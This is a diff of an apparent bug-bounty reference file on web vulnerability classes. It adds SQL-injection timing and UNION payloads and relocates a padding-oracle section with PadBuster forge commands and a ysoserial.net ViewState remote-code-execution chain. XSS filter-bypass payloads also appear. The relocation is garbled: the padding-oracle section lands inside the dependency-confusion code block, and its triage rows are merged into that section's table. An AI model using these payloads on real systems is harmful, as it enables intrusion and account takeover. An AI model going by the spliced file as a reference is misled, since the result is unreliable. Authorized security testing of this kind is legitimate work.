@@ -1,6 +1,6 @@
 ---
 name: web2-vuln-classes
-description: Complete reference for 26 web2 bug classes with root causes, detection patterns, bypass tables, exploit techniques, and real paid examples. Covers IDOR, auth bypass, XSS, SSRF (11 IP bypass techniques), SQLi, business logic, race conditions, OAuth/OIDC, file upload (10 bypass techniques), GraphQL, LLM/AI (ASI01-ASI10 agentic framework), API misconfig (mass assignment, JWT attacks, prototype pollution, CORS), ATO taxonomy (9 paths), SSTI (Jinja2/Twig/Freemarker/ERB/Spring), subdomain takeover, cloud/infra misconfigs, HTTP smuggling (CL.TE/TE.CL/H2.CL), cache poisoning, MFA bypass (7 patterns), SAML attacks (XSW/comment injection/signature stripping), error disclosure / debug endpoints (stack trace regex per framework, chain templates), CSS injection (attribute-selector exfiltration, opacity clickjacking, @import), padding oracle / crypto misuse (CBC decrypt+forge, ViewState RCE, ECB block-repetition, weak-hash quick-wins). LFI / file inclusion -> RCE (php://filter source disclosure, iconv filter-chain RCE with no upload, log/environ poisoning, .user.ini/.htaccess auto_prepend, data:// + expect:// wrappers, session inclusion, traversal bypass table). insecure deserialization (PHP __wakeup bypass / phar:// POP chains, Java ysoserial CommonsCollections gadgets + magic bytes, Python pickle __reduce__ + signed-cookie forgery, Node node-serialize). dependency confusion / supply chain (internal package-name discovery, unclaimed-name confirmation, callback-only PoC, npm/pip/Maven/RubyGems variants). Use when hunting a specific vuln class or studying what makes bugs pay.
+description: Complete reference for 26 web2 bug classes with root causes, detection patterns, bypass tables, exploit techniques, and real paid examples. Covers IDOR, auth bypass, XSS, SSRF (11 IP bypass techniques), SQLi, business logic, race conditions, OAuth/OIDC, file upload (10 bypass techniques), GraphQL, LLM/AI (ASI01-ASI10 agentic framework), API misconfig (mass assignment, JWT attacks, prototype pollution, CORS), ATO taxonomy (9 paths), SSTI (Jinja2/Twig/Freemarker/ERB/Spring), subdomain takeover, cloud/infra misconfigs, HTTP smuggling (CL.TE/TE.CL/H2.CL), cache poisoning, MFA bypass (7 patterns), SAML attacks (XSW/comment injection/signature stripping), error disclosure / debug endpoints (stack trace regex per framework, chain templates), CSS injection (attribute-selector exfiltration, opacity clickjacking, @import). LFI / file inclusion -> RCE (php://filter source disclosure, iconv filter-chain RCE with no upload, log/environ poisoning, .user.ini/.htaccess auto_prepend, data:// + expect:// wrappers, session inclusion, traversal bypass table). Insecure deserialization (PHP __wakeup bypass / phar:// POP chains, Java ysoserial CommonsCollections gadgets + magic bytes, Python pickle __reduce__ + signed-cookie forgery, Node node-serialize). Dependency confusion / supply chain (internal package-name discovery, unclaimed-name confirmation, callback-only PoC, npm/pip/Maven/RubyGems variants). Use when hunting a specific vuln class or studying what makes bugs pay.
 ---
 
 # WEB2 BUG CLASSES — 26 Classes
@@ -140,7 +140,7 @@ location.href = userInput
 - XSS + CSRF token theft = CSRF bypass on critical action
 - XSS + service worker = persistent XSS across pages
 - XSS + credential theft via fake login form = ATO
-- **No JS allowed?** CSS injection can still exfil tokens via attribute selectors — see Section 22 CSS Injection
+- **No JS allowed?** CSS injection can still exfil tokens via attribute selectors — see **CSS Injection**
 
 **WAF bypass for XSS**: Run `tools/waf_encoder.py "<payload>" --class xss` to get 20+ variants (HTML entity, unicode escape, base64-wrapped). Try `<svg onload=eval(atob('...'))>` or `<svg><animate onbegin=alert(1) attributeName=x dur=1s>` when `<script>` is blocked. Probe which chars are allowed by testing individually, then construct payload from unblocked chars.
 
@@ -362,6 +362,16 @@ grep -rn "mysql_query\|mysqli_query" --include="*.php" | grep "\$"
 ```
 
 **WAF bypass for SQLi**: Run `tools/waf_encoder.py "<payload>" --class sqli` for comment-injection (`SE/**/LECT`), MySQL version comment (`/*!50000 UNION*/`), case-mix (`SeLeCt`), operator substitute (`OR`→`||`, `=`→`LIKE`), whitespace swap (`%0a`, `%0b`, `/**/ `). AWS WAF specifically: try `/**/` between every token. ModSecurity: try `/*!50000 UNION*/` + `%0a` space substitution.
+
+### Stack → DBMS (fingerprint before blind testing, or you miss it)
+| Tech signal | DBMS | Blind probe |
+|---|---|---|
+| `.asp`/IIS/ASP.NET | MSSQL | `WAITFOR DELAY '0:0:5'` |
+| `.php`/LAMP | MySQL/MariaDB | `SLEEP(5)` |
+| Java/Spring, `.jsp` | PG/MSSQL/Oracle | `pg_sleep(5)` / `WAITFOR` / `dbms_pipe.receive_message('a',5)` |
+| Python/Rails | PG/MySQL | `pg_sleep(5)` / `SLEEP(5)` |
+
+**Prove it (read-only):** `ORDER BY N` → column count; `0' UNION SELECT NULL,@@version,NULL--` (or `version()` / `current_user`) → readable data = valid finding. Dump one table in a single request: `GROUP_CONCAT` (MySQL) / `STRING_AGG` (MSSQL 2017+, PG) / `LISTAGG` (Oracle). Reading a credentials/config table is reportable on its own — RCE not required (and DB→OS escalation is usually out of BBP scope: only when the DB user is sysadmin/superuser AND host exec is in scope).
 
 ---
 
@@ -1255,113 +1265,7 @@ url() blocked but transforms/positioning allowed                       = Info (c
 HTML email CSS rendering with rendered attacker styles                 = Medium (case-by-case)
 ```
 
----
-
-## 23. PADDING ORACLE & CRYPTO MISUSE
-> Apps encrypt session data, settings, or state into cookies / hidden fields / URL params to make them tamper-proof. When the **decryption** path leaks whether padding is valid (via differential responses), an attacker without the key can decrypt **and forge** arbitrary plaintexts. ASP.NET ViewState, Rails session cookies, and home-grown CBC-encrypted cookies remain common targets. Also covers ECB block-repetition and weak-hash quick-wins.
-
-### Identifying Padding Oracle Candidates
-| Signal | What it means |
-|---|---|
-| Cookie / token is base64 or hex, decoded length is multiple of 8 or 16 | CBC mode candidate |
-| `__VIEWSTATE` hidden field in form | ASP.NET — classic padding-oracle / ViewState-forgery target |
-| Rails <= 4.0 `_app_session` cookie not signed-then-encrypted | Padding oracle candidate (CVE-2013-0156 lineage) |
-| Java JEE `JSESSIONID` longer than usual (>64 chars base64) | Some app servers encrypt session — test for oracle |
-| Custom `auth=...`, `state=...`, `data=...` opaque blobs | Always worth probing |
-
-### Response-Signal Triangulation (1-byte flip test)
-Flip the last byte of the ciphertext and watch response:
-
-```
-500 Internal Server Error  =  STRONG signal — app leaks padding error directly
-401/403 + different body length than normal "wrong creds"  =  Possible — diff-based oracle
-200 + same body  =  Not exploitable (or oracle is timing-based, much slower attack)
-```
-
-### Mechanics (one-paragraph version)
-CBC decryption: `plaintext_block_n = decrypt(ciphertext_block_n) XOR ciphertext_block_{n-1}`. By **mutating block_{n-1}** one byte at a time and observing whether padding validates on `block_n`, an attacker recovers `decrypt(block_n)` byte-by-byte (256 tries per byte; 16 bytes per block = ~4096 requests). Same primitive lets you **forge** any plaintext: given known mapping for one block, compute the ciphertext that decrypts to your target.
-
-### PadBuster — Decrypt and Forge
-
-```bash
-# Install
-gem install padbuster
-# or: git clone https://github.com/AonCyberLabs/PadBuster && cd PadBuster
-
-# DECRYPT mode — recover plaintext of a cookie
-padbuster https://target.com/page CIPHERTEXT 16 \
-  --cookies "auth=CIPHERTEXT" \
-  --encoding 0    # 0=base64, 1=lower hex, 2=upper hex, 3=base64+url-safe
-
-# ENCRYPT mode — forge ciphertext for a chosen plaintext
-padbuster https://target.com/page CIPHERTEXT 16 \
-  --cookies "auth=CIPHERTEXT" \
-  --plaintext "user=admin&role=root"
-```
-
-Switches that matter when the oracle is noisy:
-- `-error "Internal Server Error"` — explicit signature string for "bad padding"
-- `--prefix "known_block"` — if you know a leading plaintext block, anchor against it
-- `--no-iv` — when IV is part of the cookie (some implementations strip it)
-
-### ASP.NET ViewState — Padding Oracle to RCE Chain (CVE-2010-3332 lineage)
-The crown-jewel target. If `__VIEWSTATE` validation/decryption is CBC and leaks padding errors, the chain is:
-
-```
-1. Capture __VIEWSTATE from any page (form hidden field, view-source)
-2. Run PadBuster against the page that processes the postback -> recover machineKey-equivalent oracle
-3. Use ysoserial.net to build a ViewState payload that triggers .NET deserialization gadget:
-     ysoserial.exe -p ViewState -g TextFormattingRunProperties \
-       -c "powershell ..." --decrypt KEY --validationkey KEY \
-       --validationalg HMACSHA256 --decryptionalg AES
-4. Submit forged __VIEWSTATE in POST -> RCE under app pool identity
-```
-
-Cheaper variant when machineKey is leaked elsewhere (web.config exposure via path traversal, `/elmah.axd`, `/trace.axd`, `.git/` exposure): skip PadBuster, jump straight to ysoserial.net.
-
-### Bonus — Weak Crypto Quick Wins (no padding oracle needed)
-
-```
-ECB mode detection
-  Encrypt repeated plaintext: AAAAAAAAAAAAAAAAAAAAAAAAAAAA (32 A's, two 16-byte blocks)
-  If ciphertext blocks are IDENTICAL bytes -> ECB confirmed -> block-swap / replay attacks viable
-
-Weak password hash
-  hashid <hash>  ->  identifies algorithm (MD5/SHA1/bcrypt/etc.)
-  MD5/SHA1 unsalted + leaked user table -> crackstation.net / hashcat -m 0 / -m 100
-
-"Base64 as encryption"
-  Cookie that decodes via base64 to readable JSON / key=value pairs = no actual encryption
-  Modify the plaintext, re-encode, submit -> privilege change with zero cryptanalysis
-
-Static IV / Reused nonce (CBC or GCM)
-  Two ciphertexts of equal length with byte-identical leading blocks -> likely static IV
-  Allows known-plaintext attacks and bit-flipping on the first block
-```
-
-### Chains That Pay
-```
-Padding oracle on session cookie -> decrypt -> forge admin cookie               Critical (ATO)
-ViewState padding oracle -> ysoserial.net deserialization gadget -> RCE         Critical
-Padding oracle on opaque state param -> tampered state survives integrity check Medium/High
-ECB block-swap on encrypted cookie -> role escalation                           High
-Weak hash + small user table leak -> password recovery                          High
-"Base64 as encryption" cookie -> tamper plaintext -> privilege change           High
-Padding oracle confirmed, no forge path applicable (read-only data)             Medium (info disclosure)
-Padding oracle suspected but only timing differential (no status/length diff)   Low/Info (chain only)
-```
-
-### Triage
-```
-1-byte flip on cookie -> 500, PadBuster confirms decryption/forge end-to-end    Critical
-ViewState padding oracle + ysoserial RCE PoC                                    Critical
-ECB block repetition detected + structured data + working swap attack           High
-Weak hash + actual password recovery in PoC                                     High
-"Base64 as encryption" + working privilege change PoC                           High
-Crypto oracle suspected but no working tamper/decrypt PoC                       N/A (chain only)
-```
-
-## 24. LFI / FILE INCLUSION -> RCE  📂
+## 23. LFI / FILE INCLUSION -> RCE  📂
 > A reflected "path" parameter that returns `/etc/passwd` is **not** the bug — read-only LFI is usually Medium at best and frequently downgraded to Info. The payable finding is the **escalation**: source disclosure that hands you DB creds / a JWT signing key, or a deterministic path to code execution (filter-chain, log poisoning, `.user.ini`). Always ask: "can I turn this file read into RCE or a secret that takes over an account RIGHT NOW?"
 
 ### Root Cause
@@ -1518,7 +1422,7 @@ LFI read of source -> reveals a harder bug (SQLi/SSRF/auth flaw)       upgrade p
 ```
 > Cross-references: source disclosure feeds the **Error Disclosure / Debug Endpoints** and **JWT / API Misconfiguration** classes (leaked keys -> forge tokens); upload-assisted variants overlap the **File Upload** class (`.user.ini`, polyglot magic bytes); `file://`/`expect://` wrapper reasoning mirrors the **SSRF** class. Triage rule: a bare read-only LFI with no secret and no exec path is usually **N/A** — kill it fast unless you can name the file it unlocks.
 
-## 25. INSECURE DESERIALIZATION  🧬
+## 24. INSECURE DESERIALIZATION  🧬
 > When an app rebuilds objects from attacker-controlled bytes, the deserializer can be steered into calling existing "gadget" methods that end in code execution. Almost always **RCE / Critical**. The hunt is: (1) find a sink that deserializes untrusted input, (2) confirm the wire format from its magic bytes, (3) reach for the language's known gadget chain.
 >
 > **.NET `__VIEWSTATE` deserialization is NOT here** — it lives in the Padding Oracle & Crypto Misuse class (ViewState → ysoserial.net gadget → RCE). This class covers PHP, Java, Python, and Node.
@@ -1669,8 +1573,7 @@ __wakeup-bypassed PHP object reaching __toString file read (no command exec)    
 Deserialization sink confirmed but NO gadget on classpath / blind w/ no OOB proof  N/A — not submittable until you land code exec or OOB callback
 ```
 > Deserialization is one of the few classes where a single request is plausibly Critical — but **only with a working PoC**. A `rO0AB` blob or an `unserialize()` grep hit with no demonstrated gadget execution is N/A. Land OOB (Collaborator/interactsh callback) or command output, or kill it. Where the encrypted blob also leaks a padding oracle, see the Padding Oracle & Crypto Misuse class for the ViewState/forge-the-blob path.
-
-## 26. DEPENDENCY CONFUSION / SUPPLY CHAIN  📦
+## 25. DEPENDENCY CONFUSION / SUPPLY CHAIN  📦
 
 > When an org's build pulls from **both** a private registry and the public one, an attacker who publishes a public package with the **same name + a higher version** can get their code executed inside the org's CI/dev machines. Alex Birsan's 2021 research made **$130k+ across 35 companies** (Apple, Microsoft, PayPal, Netflix, Uber, Tesla) this way — and it is still live: Microsoft Security documented 33 malicious npm packages abusing it in May 2026.
 >
@@ -1680,6 +1583,100 @@ Deserialization sink confirmed but NO gadget on classpath / blind w/ no OOB proo
 The package-manager resolver prefers **highest version across all configured registries** instead of pinning name→registry origin.
 
 ```bash
+
+## 26. PADDING ORACLE & CRYPTO MISUSE
+> Apps encrypt session data, settings, or state into cookies / hidden fields / URL params to make them tamper-proof. When the **decryption** path leaks whether padding is valid (via differential responses), an attacker without the key can decrypt **and forge** arbitrary plaintexts. ASP.NET ViewState, Rails session cookies, and home-grown CBC-encrypted cookies remain common targets. Also covers ECB block-repetition and weak-hash quick-wins.
+
+### Identifying Padding Oracle Candidates
+| Signal | What it means |
+|---|---|
+| Cookie / token is base64 or hex, decoded length is multiple of 8 or 16 | CBC mode candidate |
+| `__VIEWSTATE` hidden field in form | ASP.NET — classic padding-oracle / ViewState-forgery target |
+| Rails <= 4.0 `_app_session` cookie not signed-then-encrypted | Padding oracle candidate (CVE-2013-0156 lineage) |
+| Java JEE `JSESSIONID` longer than usual (>64 chars base64) | Some app servers encrypt session — test for oracle |
+| Custom `auth=...`, `state=...`, `data=...` opaque blobs | Always worth probing |
+
+### Response-Signal Triangulation (1-byte flip test)
+Flip the last byte of the ciphertext and watch response:
+
+```
+500 Internal Server Error  =  STRONG signal — app leaks padding error directly
+401/403 + different body length than normal "wrong creds"  =  Possible — diff-based oracle
+200 + same body  =  Not exploitable (or oracle is timing-based, much slower attack)
+```
+
+### Mechanics (one-paragraph version)
+CBC decryption: `plaintext_block_n = decrypt(ciphertext_block_n) XOR ciphertext_block_{n-1}`. By **mutating block_{n-1}** one byte at a time and observing whether padding validates on `block_n`, an attacker recovers `decrypt(block_n)` byte-by-byte (256 tries per byte; 16 bytes per block = ~4096 requests). Same primitive lets you **forge** any plaintext: given known mapping for one block, compute the ciphertext that decrypts to your target.
+
+### PadBuster — Decrypt and Forge
+
+```bash
+# Install
+gem install padbuster
+# or: git clone https://github.com/AonCyberLabs/PadBuster && cd PadBuster
+
+# DECRYPT mode — recover plaintext of a cookie
+padbuster https://target.com/page CIPHERTEXT 16 \
+  --cookies "auth=CIPHERTEXT" \
+  --encoding 0    # 0=base64, 1=lower hex, 2=upper hex, 3=base64+url-safe
+
+# ENCRYPT mode — forge ciphertext for a chosen plaintext
+padbuster https://target.com/page CIPHERTEXT 16 \
+  --cookies "auth=CIPHERTEXT" \
+  --plaintext "user=admin&role=root"
+```
+
+Switches that matter when the oracle is noisy:
+- `-error "Internal Server Error"` — explicit signature string for "bad padding"
+- `--prefix "known_block"` — if you know a leading plaintext block, anchor against it
+- `--no-iv` — when IV is part of the cookie (some implementations strip it)
+
+### ASP.NET ViewState — Padding Oracle to RCE Chain (CVE-2010-3332 lineage)
+The crown-jewel target. If `__VIEWSTATE` validation/decryption is CBC and leaks padding errors, the chain is:
+
+```
+1. Capture __VIEWSTATE from any page (form hidden field, view-source)
+2. Run PadBuster against the page that processes the postback -> recover machineKey-equivalent oracle
+3. Use ysoserial.net to build a ViewState payload that triggers .NET deserialization gadget:
+     ysoserial.exe -p ViewState -g TextFormattingRunProperties \
+       -c "powershell ..." --decrypt KEY --validationkey KEY \
+       --validationalg HMACSHA256 --decryptionalg AES
+4. Submit forged __VIEWSTATE in POST -> RCE under app pool identity
+```
+
+Cheaper variant when machineKey is leaked elsewhere (web.config exposure via path traversal, `/elmah.axd`, `/trace.axd`, `.git/` exposure): skip PadBuster, jump straight to ysoserial.net.
+
+### Bonus — Weak Crypto Quick Wins (no padding oracle needed)
+
+```
+ECB mode detection
+  Encrypt repeated plaintext: AAAAAAAAAAAAAAAAAAAAAAAAAAAA (32 A's, two 16-byte blocks)
+  If ciphertext blocks are IDENTICAL bytes -> ECB confirmed -> block-swap / replay attacks viable
+
+Weak password hash
+  hashid <hash>  ->  identifies algorithm (MD5/SHA1/bcrypt/etc.)
+  MD5/SHA1 unsalted + leaked user table -> crackstation.net / hashcat -m 0 / -m 100
+
+"Base64 as encryption"
+  Cookie that decodes via base64 to readable JSON / key=value pairs = no actual encryption
+  Modify the plaintext, re-encode, submit -> privilege change with zero cryptanalysis
+
+Static IV / Reused nonce (CBC or GCM)
+  Two ciphertexts of equal length with byte-identical leading blocks -> likely static IV
+  Allows known-plaintext attacks and bit-flipping on the first block
+```
+
+### Chains That Pay
+```
+Padding oracle on session cookie -> decrypt -> forge admin cookie               Critical (ATO)
+ViewState padding oracle -> ysoserial.net deserialization gadget -> RCE         Critical
+Padding oracle on opaque state param -> tampered state survives integrity check Medium/High
+ECB block-swap on encrypted cookie -> role escalation                           High
+Weak hash + small user table leak -> password recovery                          High
+"Base64 as encryption" cookie -> tamper plaintext -> privilege change           High
+Padding oracle confirmed, no forge path applicable (read-only data)             Medium (info disclosure)
+Padding oracle suspected but only timing differential (no status/length diff)   Low/Info (chain only)
+
 # VULNERABLE — internal pkg "acme-auth-utils" lives only on the private registry,
 # but the resolver also checks public npm. Attacker publishes acme-auth-utils@99.0.0
 # to public npm → resolver sees 99.0.0 > internal 1.4.2 → installs the attacker's.
@@ -1825,10 +1822,17 @@ Internal name found but already public / fully pinned                           
 
 ### Triage
 ```
+1-byte flip on cookie -> 500, PadBuster confirms decryption/forge end-to-end    Critical
+ViewState padding oracle + ysoserial RCE PoC                                    Critical
+ECB block repetition detected + structured data + working swap attack           High
+Weak hash + actual password recovery in PoC                                     High
+"Base64 as encryption" + working privilege change PoC                           High
+Crypto oracle suspected but no working tamper/decrypt PoC                       N/A (chain only)
 Callback fired from target-owned IP (ARIN-verified) + name was unclaimed   = Critical/High — RCE-class, submit
 Callback fired but only from registry-scanner IP                           = N/A (false positive)
 Name unclaimed + private registry config proven, no callback yet           = wait; premature report = Informative
 Name already claimed on public registry                                    = N/A (not exploitable)
 Deps fully scoped + lockfile integrity + hash-pinned                       = N/A (not confusable)
 Real payload used instead of a benign callback                             = STOP — do not submit, legal/ethical breach
+
 ```
